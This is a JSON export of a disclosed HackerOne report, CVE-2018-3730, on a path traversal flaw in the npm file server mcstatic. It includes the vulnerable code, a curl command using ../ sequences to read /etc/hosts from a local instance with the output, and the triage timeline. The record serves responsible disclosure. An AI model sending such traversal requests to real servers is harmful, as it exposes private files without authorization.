@@ -1,0 +1,377 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": null, 
+    "voters": [
+        "eveeez", 
+        "grampae", 
+        "babayaga_", 
+        "japz", 
+        "martijn"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 312907, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-04-24T19:46:28.328Z", 
+    "vulnerability_information": "Hi Guys,\n\nThere is Path Traversal in mcstatic module.\nIt allows to read content of arbitrary files on the remote server.\n\n## Module\n\n**mcstatic**\n\nThis is a general file server made by nodejs. It will be easy for you to access the files on the server through the browser.\n\nhttps://www.npmjs.com/package/mcstatic\n\nversion: 0.0.20\n\nStats\n0 downloads in the last day\n38 downloads in the last week\n150 downloads in the last month\n\n~1800 estimated downloads per year\n\n\n## Description\n\nLack of file path sanitization causes that any file on the server might be read by malicious user.\n\nIf we follow code flow, we find that first file name is read from ```req.url``` and check if exists:\n\n```javascript\n// node_modules/mcstatic/lib/staticFileHandler.js, line 19:\n    var filePath = httpHelpers.getRequestPathFromUrl(req.url);\n    var mockedFilePath = findMockFilePath(filePath,mockPaths);\n    if(mockedFilePath)\n        filePath = mockedFilePath;\n\n    var file = path.normalize(path.join(root,filePath));\n    fs.stat(file,function(error, stats){\n        if(error)\n            return statusHandlers[500](res, nextHandler, { error: error });\n```\n\nDepends on HTTP method used, handler function is called (here's for GET):\n\n```javascript\n// node_modules/mcstatic/lib/staticFileHandler.js, line 39:\nif (req.method === 'GET')\n        return responseHandlers.handleGet(res,file, stats, nextHandler);\n```\n\n```handleGet``` maps to ```streamResponse``` in ```responseHanders.js```:\n\n```javascript\n// node_modules/mcstatic/lib/responseHandlers.js, line 22:\nvar streamResponse = function(res, file, stat, next){\n    var stream = fs.createReadStream(file);\n    res.setHeader('content-length', stat.size);\n\n    stream.pipe(res);\n    stream.on('error', function (err) {\n        statusHandlers['500'](res, next, { error: err });\n    });\n\n    stream.on('end', function () {\n        res.statusCode = 200;\n        res.end();\n    });\n};\n```\n\nWe can see (line 23) that ```stream``` is created directly from ```file``` and piped to ```res``` response object.\n\n\n## Steps To Reproduce:\n\n\n- install ```mcstatic```:\n\n```\n$ npm install mcstatic\n```\n\n- run ```mcstatic``` in direcotry of your choice:\n\n```\nme:~/playground/hackerone/Node$ ./node_modules/mcstatic/bin/mcstatic \nmcstatic serving ./ on port 8080\n```\n\n- execute following ```curl``` command (adjust number of ../ to reflect your system):\n\n```\n$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/hosts\n```\n\n- see result:\n\n```\n*   Trying 127.0.0.1...\n* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n> GET /../../../../../etc/hosts HTTP/1.1\n> Host: 127.0.0.1:8080\n> User-Agent: curl/7.47.0\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n< last-modified: Tue, 23 Jan 2018 14:51:52 GMT\n< content-length: 188\n< content-type: application/octet-stream\n< Date: Tue, 06 Feb 2018 15:40:51 GMT\n< Connection: keep-alive\n< \n127.0.0.1\tlocalhost\n127.0.1.1\tLT0081U2\n\n# The following lines are desirable for IPv6 capable hosts\n::1     localhost ip6-localhost ip6-loopback\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n* Connection #0 to host 127.0.0.1 left intact\n```\n\n## Supporting Material/References:\n\n\n- Ubuntu 16.04 LTS\n- Chromium 66.0.3333.0 (Developer Build) (64-bit) \n- Node.js version: v8.9.4 LTS\n- npm version: 5.6.0\n- curl 7.47.0\n\n\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\n\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability allows to read content of any file on the server where module is run.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "high", 
+            "privileges_required": "none", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "changed", 
+            "integrity": "none", 
+            "availability": "none"
+        }, 
+        "rating": "high", 
+        "score": 8.6, 
+        "author_type": "Team"
+    }, 
+    "title": "[mcstatic] Path Traversal allows to read content of arbitrary files", 
+    "is_member_of_team?": null, 
+    "vote_count": 5, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "mcstatic", 
+        "max_severity": "critical", 
+        "databaseId": 5909, 
+        "asset_type": "SOURCE_CODE"
+    }, 
+    "allow_singular_disclosure_at": "2018-05-24T19:46:28.401Z", 
+    "state": "Closed", 
+    "cve_ids": [
+        "CVE-2018-3730"
+    ], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "old_scope": "Other module", 
+            "created_at": "2018-02-07T19:15:37.451Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-07T19:15:37.451Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "new_scope": "mcstatic", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ChangedScope", 
+            "id": 2360076, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-07T19:15:47.917Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-07T19:15:47.917Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "High (8.6)", 
+                "old_severity": "Medium"
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 2360077, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-07T19:16:12.688Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-07T19:16:12.688Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 2360080, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-07T19:16:32.101Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-07T19:16:32.101Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Hi\u00a0@bl4de ,\n\nThanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue.\n", 
+            "markdown_message": "<p>Hi\u00a0@bl4de ,</p>\n\n<p>Thanks for reporting this issue.</p>\n\n<p>I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.<br>\nI will invite the package maintainer to this issue.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2360084, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-08T02:48:30.267Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-08T02:48:30.267Z", 
+            "actor": {
+                "username": "reed", 
+                "url": "/reed", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "cve_ids": [
+                "CVE-2018-3730"
+            ], 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::CveIdAdded", 
+            "id": 2360997, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-14T20:53:11.164Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-14T20:53:11.164Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Since the author didn't join the report I opened a security issue in the repo.", 
+            "markdown_message": "<p>Since the author didn&#39;t join the report I opened a security issue in the repo.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2384080, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-24T19:46:00.887Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-24T19:46:00.887Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Disclosing the report due to no activity from the author.", 
+            "markdown_message": "<p>Disclosing the report due to no activity from the author.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2661122, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "bl4de", 
+                "url": "/bl4de"
+            }, 
+            "created_at": "2018-04-24T19:46:21.519Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-24T19:46:21.519Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 2661123, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-24T19:46:28.360Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-24T19:46:28.360Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2661124, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-24T19:46:53.227Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-24T19:46:53.227Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ManuallyDisclosed", 
+            "id": 2661126, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "bl4de", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/bl4de", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/017/622/36f4fb2f20566c21ddbacf07cd490330ca853c91_small.jpg?1424108731"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 19, 
+        "name": "Path Traversal"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -16943919.596083377, 
+    "disclosed_at": "2018-04-24T19:46:53.316Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/312907", 
+    "created_at": "2018-02-06T15:43:16.553Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>Hi Guys,</p>\n\n<p>There is Path Traversal in mcstatic module.<br>\nIt allows to read content of arbitrary files on the remote server.</p>\n\n<h2 id=\"module\">Module</h2>\n\n<p><strong>mcstatic</strong></p>\n\n<p>This is a general file server made by nodejs. It will be easy for you to access the files on the server through the browser.</p>\n\n<p><a title=\"https://www.npmjs.com/package/mcstatic\" href=\"/redirect?signature=cfba2441b50806cd25b759dbf87dad3bc118ff41&amp;url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fmcstatic\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.npmjs.com/package/mcstatic</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>version: 0.0.20</p>\n\n<p>Stats<br>\n0 downloads in the last day<br>\n38 downloads in the last week<br>\n150 downloads in the last month</p>\n\n<p>~1800 estimated downloads per year</p>\n\n<h2 id=\"description\">Description</h2>\n\n<p>Lack of file path sanitization causes that any file on the server might be read by malicious user.</p>\n\n<p>If we follow code flow, we find that first file name is read from <code>req.url</code> and check if exists:</p>\n<pre class=\"highlight javascript\"><code><span class=\"c1\">// node_modules/mcstatic/lib/staticFileHandler.js, line 19:</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">filePath</span> <span class=\"o\">=</span> <span class=\"nx\">httpHelpers</span><span class=\"p\">.</span><span class=\"nx\">getRequestPathFromUrl</span><span class=\"p\">(</span><span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">url</span><span class=\"p\">);</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">mockedFilePath</span> <span class=\"o\">=</span> <span class=\"nx\">findMockFilePath</span><span class=\"p\">(</span><span class=\"nx\">filePath</span><span class=\"p\">,</span><span class=\"nx\">mockPaths</span><span class=\"p\">);</span>\n    <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nx\">mockedFilePath</span><span class=\"p\">)</span>\n        <span class=\"nx\">filePath</span> <span class=\"o\">=</span> <span class=\"nx\">mockedFilePath</span><span class=\"p\">;</span>\n\n    <span class=\"kd\">var</span> <span class=\"nx\">file</span> <span class=\"o\">=</span> <span class=\"nx\">path</span><span class=\"p\">.</span><span class=\"nx\">normalize</span><span class=\"p\">(</span><span class=\"nx\">path</span><span class=\"p\">.</span><span class=\"nx\">join</span><span class=\"p\">(</span><span class=\"nx\">root</span><span class=\"p\">,</span><span class=\"nx\">filePath</span><span class=\"p\">));</span>\n    <span class=\"nx\">fs</span><span class=\"p\">.</span><span class=\"nx\">stat</span><span class=\"p\">(</span><span class=\"nx\">file</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">error</span><span class=\"p\">,</span> <span class=\"nx\">stats</span><span class=\"p\">){</span>\n        <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nx\">error</span><span class=\"p\">)</span>\n            <span class=\"k\">return</span> <span class=\"nx\">statusHandlers</span><span class=\"p\">[</span><span class=\"mi\">500</span><span class=\"p\">](</span><span class=\"nx\">res</span><span class=\"p\">,</span> <span class=\"nx\">nextHandler</span><span class=\"p\">,</span> <span class=\"p\">{</span> <span class=\"na\">error</span><span class=\"p\">:</span> <span class=\"nx\">error</span> <span class=\"p\">});</span>\n</code></pre>\n<p>Depends on HTTP method used, handler function is called (here&#39;s for GET):</p>\n<pre class=\"highlight javascript\"><code><span class=\"c1\">// node_modules/mcstatic/lib/staticFileHandler.js, line 39:</span>\n<span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">method</span> <span class=\"o\">===</span> <span class=\"s1\">&#39;GET&#39;</span><span class=\"p\">)</span>\n        <span class=\"k\">return</span> <span class=\"nx\">responseHandlers</span><span class=\"p\">.</span><span class=\"nx\">handleGet</span><span class=\"p\">(</span><span class=\"nx\">res</span><span class=\"p\">,</span><span class=\"nx\">file</span><span class=\"p\">,</span> <span class=\"nx\">stats</span><span class=\"p\">,</span> <span class=\"nx\">nextHandler</span><span class=\"p\">);</span>\n</code></pre>\n<p><code>handleGet</code> maps to <code>streamResponse</code> in <code>responseHanders.js</code>:</p>\n<pre class=\"highlight javascript\"><code><span class=\"c1\">// node_modules/mcstatic/lib/responseHandlers.js, line 22:</span>\n<span class=\"kd\">var</span> <span class=\"nx\">streamResponse</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">res</span><span class=\"p\">,</span> <span class=\"nx\">file</span><span class=\"p\">,</span> <span class=\"nx\">stat</span><span class=\"p\">,</span> <span class=\"nx\">next</span><span class=\"p\">){</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">stream</span> <span class=\"o\">=</span> <span class=\"nx\">fs</span><span class=\"p\">.</span><span class=\"nx\">createReadStream</span><span class=\"p\">(</span><span class=\"nx\">file</span><span class=\"p\">);</span>\n    <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nx\">setHeader</span><span class=\"p\">(</span><span class=\"s1\">&#39;content-length&#39;</span><span class=\"p\">,</span> <span class=\"nx\">stat</span><span class=\"p\">.</span><span class=\"nx\">size</span><span class=\"p\">);</span>\n\n    <span class=\"nx\">stream</span><span class=\"p\">.</span><span class=\"nx\">pipe</span><span class=\"p\">(</span><span class=\"nx\">res</span><span class=\"p\">);</span>\n    <span class=\"nx\">stream</span><span class=\"p\">.</span><span class=\"nx\">on</span><span class=\"p\">(</span><span class=\"s1\">&#39;error&#39;</span><span class=\"p\">,</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"nx\">statusHandlers</span><span class=\"p\">[</span><span class=\"s1\">&#39;500&#39;</span><span class=\"p\">](</span><span class=\"nx\">res</span><span class=\"p\">,</span> <span class=\"nx\">next</span><span class=\"p\">,</span> <span class=\"p\">{</span> <span class=\"na\">error</span><span class=\"p\">:</span> <span class=\"nx\">err</span> <span class=\"p\">});</span>\n    <span class=\"p\">});</span>\n\n    <span class=\"nx\">stream</span><span class=\"p\">.</span><span class=\"nx\">on</span><span class=\"p\">(</span><span class=\"s1\">&#39;end&#39;</span><span class=\"p\">,</span> <span class=\"kd\">function</span> <span class=\"p\">()</span> <span class=\"p\">{</span>\n        <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nx\">statusCode</span> <span class=\"o\">=</span> <span class=\"mi\">200</span><span class=\"p\">;</span>\n        <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nx\">end</span><span class=\"p\">();</span>\n    <span class=\"p\">});</span>\n<span class=\"p\">};</span>\n</code></pre>\n<p>We can see (line 23) that <code>stream</code> is created directly from <code>file</code> and piped to <code>res</code> response object.</p>\n\n<h2 id=\"steps-to-reproduce\">Steps To Reproduce:</h2>\n\n<ul>\n<li>install <code>mcstatic</code>:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>$ npm install mcstatic\n</code></pre>\n<ul>\n<li>run <code>mcstatic</code> in direcotry of your choice:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>me:~/playground/hackerone/Node$ ./node_modules/mcstatic/bin/mcstatic \nmcstatic serving ./ on port 8080\n</code></pre>\n<ul>\n<li>execute following <code>curl</code> command (adjust number of ../ to reflect your system):</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/hosts\n</code></pre>\n<ul>\n<li>see result:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>*   Trying 127.0.0.1...\n* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n&gt; GET /../../../../../etc/hosts HTTP/1.1\n&gt; Host: 127.0.0.1:8080\n&gt; User-Agent: curl/7.47.0\n&gt; Accept: */*\n&gt; \n&lt; HTTP/1.1 200 OK\n&lt; last-modified: Tue, 23 Jan 2018 14:51:52 GMT\n&lt; content-length: 188\n&lt; content-type: application/octet-stream\n&lt; Date: Tue, 06 Feb 2018 15:40:51 GMT\n&lt; Connection: keep-alive\n&lt; \n127.0.0.1   localhost\n127.0.1.1   LT0081U2\n\n# The following lines are desirable for IPv6 capable hosts\n::1     localhost ip6-localhost ip6-loopback\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n* Connection #0 to host 127.0.0.1 left intact\n</code></pre>\n<h2 id=\"supporting-material-references\">Supporting Material/References:</h2>\n\n<ul>\n<li>Ubuntu 16.04 LTS</li>\n<li>Chromium 66.0.3333.0 (Developer Build) (64-bit) </li>\n<li>Node.js version: v8.9.4 LTS</li>\n<li>npm version: 5.6.0</li>\n<li>curl 7.47.0</li>\n</ul>\n\n<p>Please feel free to invite module maintainer to this report. I haven&#39;t contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.</p>\n\n<p>I hope my report will help to keep Node.js ecosystem and its users safe in the future.</p>\n\n<p>Regards,</p>\n\n<p>Rafal &#39;bl4de&#39; Janicki</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>This vulnerability allows to read content of any file on the server where module is run.</p>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://nodejs.org/en/security/", 
+            "about": "This program is used to handle vulnerabilities in the Node.js ecosystem.", 
+            "twitter_handle": "", 
+            "name": "Node.js third-party modules"
+        }, 
+        "handle": "nodejs-ecosystem", 
+        "url": "https://hackerone.com/nodejs-ecosystem", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/023/949/309112251b444244d95977d1299148aae6482789_small.?1508679627", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/023/949/c1f5f15ac094c1327c13dd19f55dbcb7411272bd_medium.?1508679627"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 23949, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
